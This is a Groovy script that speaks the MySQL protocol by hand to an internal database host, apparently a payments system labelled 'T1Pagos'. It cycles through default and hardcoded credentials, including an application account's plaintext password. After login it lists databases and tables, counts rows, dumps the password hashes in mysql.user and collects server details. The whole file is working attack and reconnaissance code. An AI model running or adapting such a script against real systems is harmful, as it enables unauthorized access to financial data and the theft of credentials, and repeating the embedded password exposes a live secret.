// T1Pagos MySQL - Groovy with proper byte[] handling
// Fix: use ByteArrayOutputStream to concatenate byte arrays

import java.security.MessageDigest

println "=== T1PAGOS MYSQL GROOVY ==="

def concatBytes = { byte[] a, byte[] b ->
    def out = new ByteArrayOutputStream()
    out.write(a)
    out.write(b)
    out.toByteArray()
}

def readInt3 = { byte[] data, int offset ->
    (data[offset] & 0xFF) | ((data[offset+1] & 0xFF) << 8) | ((data[offset+2] & 0xFF) << 16)
}

def hashPassword = { String password, byte[] authData ->
    if (!password) return new byte[0]
    def md = MessageDigest.getInstance("SHA-1")
    def hash1 = md.digest(password.getBytes("latin1"))
    md.reset()
    def hash2 = md.digest(hash1)
    md.reset()
    def combined = concatBytes(authData, hash2)
    def hash12 = md.digest(combined)
    def result = new byte[hash1.length]
    for (int i = 0; i < hash1.length; i++) {
        result[i] = (byte)((hash1[i] & 0xFF) ^ (hash12[i] & 0xFF))
    }
    return result
}

def sock = new Socket("172.27.141.4", 3306)
sock.soTimeout = 15000
def inp = new DataInputStream(sock.inputStream)
def outp = sock.outputStream

// Read greeting packet
def hdr = new byte[4]
inp.readFully(hdr)
def plen = readInt3(hdr, 0)
def greeting = new byte[plen]
inp.readFully(greeting)

// Parse version
int nullPos = 0
for (int i = 1; i < greeting.length; i++) {
    if (greeting[i] == 0) { nullPos = i; break }
}
def serverVersion = new String(greeting, 1, nullPos - 1, "latin1")
println "Server version: ${serverVersion}"

// Extract auth data
def auth1 = Arrays.copyOfRange(greeting, nullPos + 5, nullPos + 13)
// Find position after capabilities, charset, status, caps_upper, auth_len, reserved
int off = nullPos + 1 + 4 + 8 + 1  // null + thread_id + auth1 + filler
off += 2  // capabilities
off += 1  // charset
off += 2  // status
off += 2  // caps upper
def authDataLen = greeting[off] & 0xFF
off += 1
off += 10  // reserved

int auth2End = off + Math.max(13, authDataLen - 8)
auth2End = Math.min(auth2End, greeting.length)
// Find null terminator
int auth2Len = auth2End - off
while (auth2Len > 0 && greeting[off + auth2Len - 1] == 0) auth2Len--
def auth2 = Arrays.copyOfRange(greeting, off, off + auth2Len)

def authData = concatBytes(auth1, auth2)
println "Auth data length: ${authData.length}"

// Try credentials
def creds = [
    ["root", "", ""],
    ["app_t1", 'wUt22Us2CUh#+M=', "payment_t1"],
    ["root", "root", ""],
]

def authed = false
def authUser = null

for (cred in creds) {
    def user = cred[0]
    def pass = cred[1]
    def db = cred[2]
    
    println "\nTrying: ${user}"
    def pwdHash = hashPassword(pass, authData)
    
    // Build client response packet
    def pkt = new ByteArrayOutputStream()
    def clientFlags = 0x000FA685
    pkt.write([clientFlags & 0xFF, (clientFlags >> 8) & 0xFF, (clientFlags >> 16) & 0xFF, (clientFlags >> 24) & 0xFF] as byte[])  // client flags
    pkt.write([0xFF, 0xFF, 0xFF, 0x00] as byte[])  // max packet
    pkt.write(8 as byte)  // charset
    pkt.write(new byte[23])  // reserved
    pkt.write(user.getBytes("latin1"))
    pkt.write(0 as byte)
    pkt.write(pwdHash.length as byte)
    if (pwdHash.length > 0) pkt.write(pwdHash)
    if (db) {
        pkt.write(db.getBytes("latin1"))
    }
    pkt.write(0 as byte)
    
    def pktBytes = pkt.toByteArray()
    def pktHeader = [pktBytes.length & 0xFF, (pktBytes.length >> 8) & 0xFF, (pktBytes.length >> 16) & 0xFF, 1] as byte[]
    outp.write(pktHeader)
    outp.write(pktBytes)
    outp.flush()
    
    // Read auth response
    def rHdr = new byte[4]
    inp.readFully(rHdr)
    def rLen = readInt3(rHdr, 0)
    def rData = new byte[rLen]
    inp.readFully(rData)
    
    def firstByte = rData[0] & 0xFF
    if (firstByte == 0x00) {
        println "AUTH OK!"
        authed = true
        authUser = user
        break
    } else if (firstByte == 0xFF) {
        def errCode = ((rData[2] & 0xFF) << 8) | (rData[1] & 0xFF)
        def errMsg = rLen > 9 ? new String(rData, 9, rLen - 9, "latin1") : "unknown"
        println "AUTH ERROR ${errCode}: ${errMsg}"
        // Close and reconnect for next attempt
        sock.close()
        sock = new Socket("172.27.141.4", 3306)
        sock.soTimeout = 15000
        inp = new DataInputStream(sock.inputStream)
        outp = sock.outputStream
        inp.readFully(hdr)
        plen = readInt3(hdr, 0)
        greeting = new byte[plen]
        inp.readFully(greeting)
    } else {
        println "Unexpected response: " + firstByte
    }
}

if (!authed) {
    println "FAILED"
    sock.close()
    return
}

// Query helper
def runQuery = { String sql ->
    def qPkt = new ByteArrayOutputStream()
    qPkt.write(3 as byte)  // COM_QUERY
    qPkt.write(sql.getBytes("utf-8"))
    def qBytes = qPkt.toByteArray()
    def qHdr = [qBytes.length & 0xFF, (qBytes.length >> 8) & 0xFF, (qBytes.length >> 16) & 0xFF, 0] as byte[]
    outp.write(qHdr)
    outp.write(qBytes)
    outp.flush()
    
    def rows = []
    def state = "count"
    
    while (true) {
        def ph = new byte[4]
        try {
            inp.readFully(ph)
        } catch(e) {
            break
        }
        def pl = readInt3(ph, 0)
        if (pl == 0) break
        def pd = new byte[pl]
        inp.readFully(pd)
        def fb = pd[0] & 0xFF
        
        if (fb == 0xFF) {
            def ec = ((pd[2] & 0xFF) << 8) | (pd[1] & 0xFF)
            def em = pl > 9 ? new String(pd, 9, pl - 9, "latin1") : "err"
            return [["QUERY ERROR ${ec}: ${em}"]]
        }
        if (fb == 0xFE && pl < 9) {
            if (state == "cols") { state = "rows"; continue }
            if (state == "rows") break
            continue
        }
        if (state == "count") {
            if (fb == 0x00) return [["OK"]]
            state = "cols"
            continue
        }
        if (state == "cols") continue
        if (state == "rows") {
            def row = []
            int pos = 0
            while (pos < pl) {
                int b = pd[pos] & 0xFF
                if (b == 0xFB) { row << "NULL"; pos++ }
                else if (b < 251) {
                    row << new String(pd, pos+1, b, "utf-8")
                    pos += 1 + b
                }
                else if (b == 0xFC) {
                    int fl = ((pd[pos+2] & 0xFF) << 8) | (pd[pos+1] & 0xFF)
                    row << new String(pd, pos+3, fl, "utf-8")
                    pos += 3 + fl
                }
                else { break }
            }
            if (row) rows << row
        }
    }
    return rows
}

println "\n=== QUERIES AS ${authUser} ==="

println "\n--- SHOW DATABASES ---"
runQuery("SHOW DATABASES").each { r -> println "  " + r.join(" | ") }

println "\n--- payment_t1 TABLES ---"
runQuery("SHOW TABLES IN payment_t1").each { r -> println "  " + r.join(" | ") }

println "\n--- TABLE ROW COUNTS ---"
runQuery("SELECT table_schema, table_name, table_rows FROM information_schema.tables WHERE table_schema NOT IN ('information_schema','mysql','performance_schema') ORDER BY table_rows DESC LIMIT 30").each { r -> println "  " + r.join(" | ") }

println "\n--- MYSQL USERS ---"
runQuery("SELECT user, host, password FROM mysql.user").each { r -> println "  " + r.join(" | ") }

println "\n--- SERVER INFO ---"
runQuery("SELECT @@hostname, @@version, @@port, @@datadir").each { r -> println "  " + r.join(" | ") }

sock.close()
println "\n=== FIN ==="
